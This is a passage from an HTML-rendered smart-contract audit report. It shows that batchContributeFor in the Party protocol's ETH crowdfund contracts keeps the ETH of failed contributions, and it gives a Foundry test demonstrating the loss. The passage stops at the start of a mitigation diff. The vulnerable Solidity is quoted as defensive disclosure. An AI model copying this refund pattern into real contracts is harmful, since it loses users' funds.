href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L174-L202\">https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L174-L202</a></p>\n<p>This vulnerability exists in both the <a href=\"https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/InitialETHCrowdfund.sol\"><code>InitialETHCrowdfund</code></a> and <a href=\"https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/ReraiseETHCrowdfund.sol\"><code>ReraiseETHCrowdfund</code></a> contracts in exactly the same way.</p>\n<p>I will continue this report by explaining the issue in only one contract. The mitigation section however contains the fix for both instances.</p>\n<p>The <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L235-L268\"><code>batchContributeFor</code></a> function is a wrapper that allows to make multiple calls to <code>contributeFor</code> within one function call.</p>\n<p>It is possible to specify that this function should not revert when one individual call to <code>contributeFor</code> fails by setting <code>args.revertOnFailure=false</code>.</p>\n<p>The issue is that in this case the ETH for a failed contribution is not refunded which leads a loss of funds for the user calling the function.</p>\n<p>Note:<br>\nThis issue also exists in the <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/Crowdfund.sol#L367-L385\"><code>Crowdfund.batchContributeFor</code></a> function which is out of scope. The sponsor knows about this and will fix it.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Let’s look at the <code>batchContributeFor</code> function:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/InitialETHCrowdfund.sol#L235-L268\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">batchContributeFor</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">BatchContributeForArgs</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">args</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyDelegateCall</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint96</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPowers</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numContributions</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recipients</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">votingPowers</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint96</span><span class=\"mtk1\">[](</span><span class=\"mtk12\">numContributions</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAvailable</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numContributions</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ethAvailable</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">values</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">r</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{ value: </span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">values</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] }(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeCall</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk4\">this</span><span class=\"mtk1\">.</span><span class=\"mtk12\">contributeFor</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recipients</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">initialDelegates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">gateDatas</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">s</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">revertOnFailure</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">r</span><span class=\"mtk1\">.</span><span class=\"mtk11\">rawRevert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">votingPowers</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">r</span><span class=\"mtk1\">, (</span><span class=\"mtk12\">uint96</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Refund any unused ETH.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">ethAvailable</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethAvailable</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>We can see that <code>ethAvailable</code> is reduced before every call to <code>contributeFor</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">ethAvailable</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">values</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<p>But it is only checked later if the call was successful:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">s</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">args</span><span class=\"mtk1\">.</span><span class=\"mtk12\">revertOnFailure</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">r</span><span class=\"mtk1\">.</span><span class=\"mtk11\">rawRevert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>And if <code>args.revertOnFailure=false</code> there is no revert and <code>ethAvailable</code> is not increased again.</p>\n<p>Therefore the user has to pay for failed contributions.</p>\n<p>Add the following test to the <code>InitialETHCrowdfund.t.sol</code> test file:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_batchContributeFor_noETHRefund</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">InitialETHCrowdfund</span><span class=\"mtk1\"> </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createCrowdfund</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">initialContribution:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">initialContributor:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">initialDelegate:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">minContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">maxContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint96</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">disableContributingForExistingCard:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">minTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">3</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">maxTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">duration:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">fundingSplitBps:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">fundingSplitRecipient:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Party</span><span class=\"mtk1\"> </span><span class=\"mtk12\">party</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">party</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2.5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Batch contribute for</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipients</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">payable</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegates</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">values</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint96</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gateDatas</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">3</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">recipients</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">delegates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">values</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// @audit-info set values[2] = 0.5 ether such that contribution fails (minContribution = 1 ether)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">values</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0.5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPowers</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">batchContributeFor</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">2.5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">InitialETHCrowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">BatchContributeForArgs</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenIds:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">recipients:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipients</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialDelegates:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">delegates</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">values:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">values</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">gateDatas:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gateDatas</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revertOnFailure:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// @audit-info balance of sender is 0 ETH even though 0.5 ETH of the 2.5 ETH should have been refunded</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The <code>sender</code> sends 2.5 ETH and 1 of the 3 contributions fails since <code>minContribution</code> is above the amount the <code>sender</code> wants to contribute (Note that in practice there are more ways for the contribution to fail).</p>\n<p>The sender’s balance in the end is 0 ETH which shows that there is no refund.</p>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode,Foundry</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The following changes need to be made to the <code>InitialETHCrowdfund</code> and <code>ReraiseETHCrowdfund</code> contracts:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/InitialETHCrowdfund.sol b/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span 